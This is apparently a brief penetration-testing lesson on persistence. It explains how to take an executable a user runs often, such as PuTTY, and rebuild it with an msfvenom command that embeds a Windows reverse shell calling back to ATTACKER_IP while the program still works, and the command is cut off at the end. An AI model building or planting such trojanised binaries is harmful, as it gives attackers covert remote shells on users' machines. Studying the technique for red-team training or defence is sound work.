# Backdoor Executable

### Executable Files

* If you find any executable laying around the desktop, the chances are high that the user might use it frequently.
* Suppose we find a shortcut to `PuTTY` lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

```
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lp
```
